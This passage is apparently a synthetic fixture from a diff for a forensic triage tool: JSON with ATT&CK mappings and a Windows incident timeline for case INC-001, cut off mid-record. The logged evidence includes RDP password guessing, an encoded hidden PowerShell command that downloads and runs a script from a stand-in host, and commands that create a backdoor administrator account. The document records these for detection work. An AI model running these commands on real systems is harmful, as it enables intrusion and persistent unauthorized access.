+          "confidence": "Medium",
+          "confidence_factors": [
+            "base level for this mapping: Medium",
+            "not raised: it is not the case that the failure count is at least twice the detection threshold"
+          ],
+          "evidence_sources": [
+            "EVL-0004",
+            "EVL-0005",
+            "EVL-0006",
+            "EVL-0007",
+            "EVL-0008",
+            "EVL-0009"
+          ],
+          "finding_id": "F-001",
+          "ioc_ids": [
+            "IOC-001",
+            "IOC-002"
+          ],
+          "mapping_rule_id": "DET001-T1110.001",
+          "rationale": "6 failed logons for account 'ahmed' from 198.51.100.23 within 120 s (threshold 5); the recorded failure reasons (wrong password=6) are wrong-password failures, which is consistent with password guessing against one account.",
+          "rule_id": "DET-001",
+          "supporting_events": [
+            "E-00011",
+            "E-00012",
+            "E-00013",
+            "E-00014",
+            "E-00015",
+            "E-00016"
+          ]
+        }
+      ],
+      "subtechnique_id": "T1110.001",
+      "subtechnique_name": "Password Guessing",
+      "supporting_events": [
+        "E-00011",
+        "E-00012",
+        "E-00013",
+        "E-00014",
+        "E-00015",
+        "E-00016"
+      ],
+      "tactic": "Credential Access",
+      "tactic_id": "TA0006",
+      "tactics": [
+        {
+          "id": "TA0006",
+          "name": "Credential Access"
+        }
+      ],
+      "technique_id": "T1110.001",
+      "technique_name": "Brute Force: Password Guessing"
+    },
+    {
+      "attack_version": "19.2",
+      "confidence": "High",
+      "confidence_factors": [
+        "base level for this mapping: Medium",
+        "raised to High: a file record (files.json) shows a file was created at the path the script uses"
+      ],
+      "evidence_sources": [
+        "PROC-0006",
+        "PS-0002"
+      ],
+      "ioc_ids": [
+        "IOC-005",
+        "IOC-006",
+        "IOC-008"
+      ],
+      "is_subtechnique": false,
+      "mapping_id": "MAP-T1105-TA0011",
+      "parent_technique_id": null,
+      "parent_technique_name": null,
+      "reason": "Script text for PID 6012 uses a download function and the finding's evidence includes a remote URL. Consistent with transferring a file from an external system into the host.",
+      "related_finding": "F-002",
+      "related_findings": [
+        "F-002"
+      ],
+      "sources": [
+        {
+          "confidence": "High",
+          "confidence_factors": [
+            "base level for this mapping: Medium",
+            "raised to High: a file record (files.json) shows a file was created at the path the script uses"
+          ],
+          "evidence_sources": [
+            "PROC-0006",
+            "PS-0002"
+          ],
+          "finding_id": "F-002",
+          "ioc_ids": [
+            "IOC-005",
+            "IOC-006",
+            "IOC-008"
+          ],
+          "mapping_rule_id": "DET002-T1105",
+          "rationale": "Script text for PID 6012 uses a download function and the finding's evidence includes a remote URL. Consistent with transferring a file from an external system into the host.",
+          "rule_id": "DET-002",
+          "supporting_events": [
+            "E-00022",
+            "E-00023"
+          ]
+        }
+      ],
+      "subtechnique_id": null,
+      "subtechnique_name": null,
+      "supporting_events": [
+        "E-00022",
+        "E-00023"
+      ],
+      "tactic": "Command and Control",
+      "tactic_id": "TA0011",
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control"
+        }
+      ],
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer"
+    }
+  ],
+  "provenance_check": {
+    "findings_checked": 4,
+    "ioc_count": 10,
+    "issues": [],
+    "note": "Reference consistency only; does not establish that evidence is authentic or that activity is malicious.",
+    "raw_record_count": 39,
+    "status": "passed",
+    "timeline_event_count": 32
+  },
+  "schema_version": "1.0",
+  "summary": "Analysis of case INC-001 on WIN-PC-01: 32 timeline event(s), 4 finding(s), 10 IOC(s), and 6 supported ATT&CK mapping(s). Findings are rule-based triage results and require analyst review.",
+  "time_end": "2026-10-08T07:35:31Z",
+  "time_start": "2026-10-08T06:54:58Z",
+  "timeline": [
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": null,
+        "channel": "Security",
+        "failure_reason": "wrong password",
+        "logon_process": null,
+        "logon_type": 2,
+        "logon_type_name": "Interactive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48210,
+        "source_ip": null,
+        "status": "0xC000006D",
+        "sub_status": "0xC000006A",
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4625,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00001",
+      "event_type": "logon_failed",
+      "evidence_id": "EVL-0001",
+      "source": "events",
+      "timestamp": "2026-10-08T06:54:58Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": "Negotiate",
+        "channel": "Security",
+        "logon_process": "User32",
+        "logon_type": 2,
+        "logon_type_name": "Interactive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48211,
+        "source_ip": null,
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4624,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00002",
+      "event_type": "logon_success",
+      "evidence_id": "EVL-0002",
+      "source": "events",
+      "timestamp": "2026-10-08T06:55:12Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "C:\\Windows\\explorer.exe",
+        "executable_path": "C:\\Windows\\explorer.exe",
+        "name": "explorer.exe",
+        "origin": "live_snapshot",
+        "parent_name": "userinit.exe",
+        "pid": 2210,
+        "ppid": 2180,
+        "sha256": "5c912d9b41a18d72f1c7a42cef93f905f74170f09bbfabaf828e7bbac5cf4ca0",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00003",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0001",
+      "source": "processes",
+      "timestamp": "2026-10-08T06:55:40Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+        "executable_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "name": "chrome.exe",
+        "origin": "live_snapshot",
+        "parent_name": "explorer.exe",
+        "pid": 5304,
+        "ppid": 2210,
+        "sha256": "2ae3d5584538c3591a5f2e2bc0cf420cb850a8e21fcc1747ade028f3dbccd6b2",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00004",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0002",
+      "source": "processes",
+      "timestamp": "2026-10-08T07:02:40Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "direction": "outbound",
+        "local_address": "10.20.0.15",
+        "local_port": 50112,
+        "origin": "event_log",
+        "pid": 5304,
+        "process_name": "chrome.exe",
+        "protocol": "TCP",
+        "remote_address": "192.0.2.44",
+        "remote_hostname": "mail.example.org",
+        "remote_port": 443,
+        "state": "ESTABLISHED",
+        "user_context": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00005",
+      "event_type": "network_connection",
+      "evidence_id": "NET-0001",
+      "source": "network",
+      "timestamp": "2026-10-08T07:02:44Z",
+      "user": null
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": "Negotiate",
+        "channel": "Security",
+        "logon_process": "Advapi",
+        "logon_type": 5,
+        "logon_type_name": "Service",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48212,
+        "source_ip": null,
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-05-20T10:00:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0005",
+          "groups": [
+            "Backup Operators"
+          ],
+          "is_admin": false,
+          "username": "svc_backup"
+        },
+        "windows_event_id": 4624,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00006",
+      "event_type": "logon_success",
+      "evidence_id": "EVL-0003",
+      "source": "events",
+      "timestamp": "2026-10-08T07:15:02Z",
+      "user": "svc_backup"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "powershell.exe -NoProfile -File C:\\IT\\Scripts\\disk-report.ps1",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "name": "powershell.exe",
+        "origin": "event_log",
+        "parent_name": "svchost.exe",
+        "pid": 3920,
+        "ppid": 1124,
+        "sha256": "5616f8219b305d89f1cddcd8b09237f2c464e0d5ff6080079c5510e6983e33d6",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-05-20T10:00:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0005",
+          "groups": [
+            "Backup Operators"
+          ],
+          "is_admin": false,
+          "username": "svc_backup"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00007",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0003",
+      "source": "processes",
+      "timestamp": "2026-10-08T07:15:03Z",
+      "user": "svc_backup"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command": "Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free | Export-Csv C:\\IT\\Reports\\disk-report.csv -NoTypeInformation",
+        "host_application": "powershell.exe -NoProfile -File C:\\IT\\Scripts\\disk-report.ps1",
+        "log": "Microsoft-Windows-PowerShell/Operational",
+        "origin": "script_block_log",
+        "pid": 3920,
+        "script_path": "C:\\IT\\Scripts\\disk-report.ps1",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-05-20T10:00:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0005",
+          "groups": [
+            "Backup Operators"
+          ],
+          "is_admin": false,
+          "username": "svc_backup"
+        },
+        "windows_event_id": 4104
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00008",
+      "event_type": "powershell_executed",
+      "evidence_id": "PS-0001",
+      "source": "powershell",
+      "timestamp": "2026-10-08T07:15:03Z",
+      "user": "svc_backup"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "modified_at": "2026-10-08T07:15:04Z",
+        "name": "disk-report.csv",
+        "owner": "svc_backup",
+        "path": "C:\\IT\\Reports\\disk-report.csv",
+        "sha256": "493e79a4d12d0a1558d2f062ca0d7bb59ddcfe796009e6a54801b93ce33894a4",
+        "size_bytes": 482,
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-05-20T10:00:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0005",
+          "groups": [
+            "Backup Operators"
+          ],
+          "is_admin": false,
+          "username": "svc_backup"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00009",
+      "event_type": "file_created",
+      "evidence_id": "FILE-0001",
+      "source": "files",
+      "timestamp": "2026-10-08T07:15:04Z",
+      "user": "svc_backup"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "direction": "inbound",
+        "local_address": "10.20.0.15",
+        "local_port": 3389,
+        "origin": "event_log",
+        "pid": 1180,
+        "process_name": "svchost.exe",
+        "protocol": "TCP",
+        "remote_address": "198.51.100.23",
+        "remote_hostname": null,
+        "remote_port": 51790,
+        "state": "ESTABLISHED",
+        "user_context": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00010",
+      "event_type": "network_connection",
+      "evidence_id": "NET-0002",
+      "source": "network",
+      "timestamp": "2026-10-08T07:31:00Z",
+      "user": null
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": null,
+        "channel": "Security",
+        "failure_reason": "wrong password",
+        "logon_process": null,
+        "logon_type": 10,
+        "logon_type_name": "RemoteInteractive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48213,
+        "source_ip": "198.51.100.23",
+        "status": "0xC000006D",
+        "sub_status": "0xC000006A",
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4625,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00011",
+      "event_type": "logon_failed",
+      "evidence_id": "EVL-0004",
+      "source": "events",
+      "timestamp": "2026-10-08T07:31:02Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": null,
+        "channel": "Security",
+        "failure_reason": "wrong password",
+        "logon_process": null,
+        "logon_type": 10,
+        "logon_type_name": "RemoteInteractive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48214,
+        "source_ip": "198.51.100.23",
+        "status": "0xC000006D",
+        "sub_status": "0xC000006A",
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4625,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00012",
+      "event_type": "logon_failed",
+      "evidence_id": "EVL-0005",
+      "source": "events",
+      "timestamp": "2026-10-08T07:31:15Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": null,
+        "channel": "Security",
+        "failure_reason": "wrong password",
+        "logon_process": null,
+        "logon_type": 10,
+        "logon_type_name": "RemoteInteractive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48215,
+        "source_ip": "198.51.100.23",
+        "status": "0xC000006D",
+        "sub_status": "0xC000006A",
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4625,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00013",
+      "event_type": "logon_failed",
+      "evidence_id": "EVL-0006",
+      "source": "events",
+      "timestamp": "2026-10-08T07:31:28Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": null,
+        "channel": "Security",
+        "failure_reason": "wrong password",
+        "logon_process": null,
+        "logon_type": 10,
+        "logon_type_name": "RemoteInteractive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48216,
+        "source_ip": "198.51.100.23",
+        "status": "0xC000006D",
+        "sub_status": "0xC000006A",
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4625,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00014",
+      "event_type": "logon_failed",
+      "evidence_id": "EVL-0007",
+      "source": "events",
+      "timestamp": "2026-10-08T07:31:41Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": null,
+        "channel": "Security",
+        "failure_reason": "wrong password",
+        "logon_process": null,
+        "logon_type": 10,
+        "logon_type_name": "RemoteInteractive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48217,
+        "source_ip": "198.51.100.23",
+        "status": "0xC000006D",
+        "sub_status": "0xC000006A",
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4625,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00015",
+      "event_type": "logon_failed",
+      "evidence_id": "EVL-0008",
+      "source": "events",
+      "timestamp": "2026-10-08T07:31:55Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": null,
+        "channel": "Security",
+        "failure_reason": "wrong password",
+        "logon_process": null,
+        "logon_type": 10,
+        "logon_type_name": "RemoteInteractive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48218,
+        "source_ip": "198.51.100.23",
+        "status": "0xC000006D",
+        "sub_status": "0xC000006A",
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4625,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00016",
+      "event_type": "logon_failed",
+      "evidence_id": "EVL-0009",
+      "source": "events",
+      "timestamp": "2026-10-08T07:32:08Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "direction": "inbound",
+        "local_address": "10.20.0.15",
+        "local_port": 3389,
+        "origin": "event_log",
+        "pid": 1180,
+        "process_name": "svchost.exe",
+        "protocol": "TCP",
+        "remote_address": "198.51.100.23",
+        "remote_hostname": null,
+        "remote_port": 51842,
+        "state": "ESTABLISHED",
+        "user_context": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00017",
+      "event_type": "network_connection",
+      "evidence_id": "NET-0003",
+      "source": "network",
+      "timestamp": "2026-10-08T07:32:38Z",
+      "user": null
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "authentication_package": "Negotiate",
+        "channel": "Security",
+        "logon_process": "User32",
+        "logon_type": 10,
+        "logon_type_name": "RemoteInteractive",
+        "provider": "Microsoft-Windows-Security-Auditing",
+        "record_number": 48219,
+        "source_ip": "198.51.100.23",
+        "target_domain": "WIN-PC-01",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4624,
+        "workstation": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00018",
+      "event_type": "logon_success",
+      "evidence_id": "EVL-0010",
+      "source": "events",
+      "timestamp": "2026-10-08T07:32:40Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "C:\\Windows\\explorer.exe",
+        "executable_path": "C:\\Windows\\explorer.exe",
+        "name": "explorer.exe",
+        "origin": "event_log",
+        "parent_name": "userinit.exe",
+        "pid": 4488,
+        "ppid": 4410,
+        "sha256": "5c912d9b41a18d72f1c7a42cef93f905f74170f09bbfabaf828e7bbac5cf4ca0",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00019",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0004",
+      "source": "processes",
+      "timestamp": "2026-10-08T07:32:58Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "modified_at": "2026-10-08T07:33:30Z",
+        "name": "invoice_update.vbs",
+        "owner": "ahmed",
+        "path": "C:\\Users\\ahmed\\Downloads\\invoice_update.vbs",
+        "sha256": "c8e2fe830a159ef1e219bde803ea689837bce62d5224f90c5531d0d9ae2c2535",
+        "size_bytes": 912,
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00020",
+      "event_type": "file_created",
+      "evidence_id": "FILE-0002",
+      "source": "files",
+      "timestamp": "2026-10-08T07:33:30Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "\"C:\\Windows\\System32\\wscript.exe\" \"C:\\Users\\ahmed\\Downloads\\invoice_update.vbs\"",
+        "executable_path": "C:\\Windows\\System32\\wscript.exe",
+        "name": "wscript.exe",
+        "origin": "event_log",
+        "parent_name": "explorer.exe",
+        "pid": 5120,
+        "ppid": 4488,
+        "sha256": "279eda845a3a11b6fc8c20c4c762f746bd2c5d5e218ee2915595c75bb4e814e0",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00021",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0005",
+      "source": "processes",
+      "timestamp": "2026-10-08T07:33:52Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AZgBpAGwAZQBzAC0AcwB5AG4AYwAuAGUAeABhAG0AcABsAGUALgBuAGUAdAAvAHMAdABhAGcAZQAvAHUAcABkAGEAdABlAF8AcwB2AGMALgBwAHMAMQAnADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAXwBzAHYAYwAuAHAAcwAxADsAcABvAHcAZQByAHMAaABlAGwAbAAgAC0ARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAXwBzAHYAYwAuAHAAcwAxAA==",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "name": "powershell.exe",
+        "origin": "event_log",
+        "parent_name": "wscript.exe",
+        "pid": 6012,
+        "ppid": 5120,
+        "sha256": "5616f8219b305d89f1cddcd8b09237f2c464e0d5ff6080079c5510e6983e33d6",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00022",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0006",
+      "source": "processes",
+      "timestamp": "2026-10-08T07:34:01Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command": "$u='https://files-sync.example.net/stage/update_svc.ps1';Invoke-WebRequest -Uri $u -OutFile C:\\Users\\Public\\update_svc.ps1;powershell -File C:\\Users\\Public\\update_svc.ps1",
+        "host_application": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AZgBpAGwAZQBzAC0AcwB5AG4AYwAuAGUAeABhAG0AcABsAGUALgBuAGUAdAAvAHMAdABhAGcAZQAvAHUAcABkAGEAdABlAF8AcwB2AGMALgBwAHMAMQAnADsASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAXwBzAHYAYwAuAHAAcwAxADsAcABvAHcAZQByAHMAaABlAGwAbAAgAC0ARgBpAGwAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAdQBwAGQAYQB0AGUAXwBzAHYAYwAuAHAAcwAxAA==",
+        "log": "Microsoft-Windows-PowerShell/Operational",
+        "origin": "script_block_log",
+        "pid": 6012,
+        "script_path": null,
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4104
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00023",
+      "event_type": "powershell_executed",
+      "evidence_id": "PS-0002",
+      "source": "powershell",
+      "timestamp": "2026-10-08T07:34:02Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "modified_at": "2026-10-08T07:34:09Z",
+        "name": "update_svc.ps1",
+        "owner": "ahmed",
+        "path": "C:\\Users\\Public\\update_svc.ps1",
+        "sha256": "dc2b08f6eff0cd3255c996ab6f9ff4f922504bc447eb252cfb03c9e451649a84",
+        "size_bytes": 164,
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00024",
+      "event_type": "file_created",
+      "evidence_id": "FILE-0003",
+      "source": "files",
+      "timestamp": "2026-10-08T07:34:09Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "direction": "outbound",
+        "local_address": "10.20.0.15",
+        "local_port": 49822,
+        "origin": "event_log",
+        "pid": 6012,
+        "process_name": "powershell.exe",
+        "protocol": "TCP",
+        "remote_address": "203.0.113.77",
+        "remote_hostname": "files-sync.example.net",
+        "remote_port": 443,
+        "state": "ESTABLISHED",
+        "user_context": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00025",
+      "event_type": "network_connection",
+      "evidence_id": "NET-0004",
+      "source": "network",
+      "timestamp": "2026-10-08T07:34:12Z",
+      "user": null
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\update_svc.ps1",
+        "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "name": "powershell.exe",
+        "origin": "event_log",
+        "parent_name": "powershell.exe",
+        "pid": 6188,
+        "ppid": 6012,
+        "sha256": "5616f8219b305d89f1cddcd8b09237f2c464e0d5ff6080079c5510e6983e33d6",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        }
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00026",
+      "event_type": "process_created",
+      "evidence_id": "PROC-0007",
+      "source": "processes",
+      "timestamp": "2026-10-08T07:34:44Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command": "net user svc_helpdesk [REDACTED] /add; net localgroup Administrators svc_helpdesk /add",
+        "host_application": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\Public\\update_svc.ps1",
+        "log": "Microsoft-Windows-PowerShell/Operational",
+        "origin": "script_block_log",
+        "pid": 6188,
+        "script_path": "C:\\Users\\Public\\update_svc.ps1",
+        "user_context": {
+          "account_type": "local",
+          "created_at": "2025-03-12T09:14:00Z",
+          "enabled": true,
+          "evidence_id": "USR-0003",
+          "groups": [
+            "Administrators",
+            "Users"
+          ],
+          "is_admin": true,
+          "username": "ahmed"
+        },
+        "windows_event_id": 4104
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00027",
+      "event_type": "powershell_executed",
+      "evidence_id": "PS-0003",
+      "source": "powershell",
+      "timestamp": "2026-10-08T07:34:45Z",
+      "user": "ahmed"
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "direction": "outbound",
+        "local_address": "10.20.0.15",
+        "local_port": 49871,
+        "origin": "event_log",
+        "pid": 6188,
+        "process_name": "powershell.exe",
+        "protocol": "TCP",
+        "remote_address": "203.0.113.77",
+        "remote_hostname": "files-sync.example.net",
+        "remote_port": 8443,
+        "state": "ESTABLISHED",
+        "user_context": null
+      },
+      "device": "WIN-PC-01",
+      "event_id": "E-00028",
+      "event_type": "network_connection",
+      "evidence_id": "NET-0005",
+      "source": "network",
+      "timestamp": "2026-10-08T07:34:50Z",
+      "user": null
+    },
+    {
+      "case_id": "INC-001",
+      "details": {
+        "command_line": "net.exe user svc_helpdesk [REDACTED] /add",
+        "executable_path": "C:\\Windows\\System32\\net.exe",
+        "name": "net.exe",
+        "origin": "event_log",
+        "parent_name": "powershell.exe",
+        "pid": 6240,
+        "ppid": 6188,
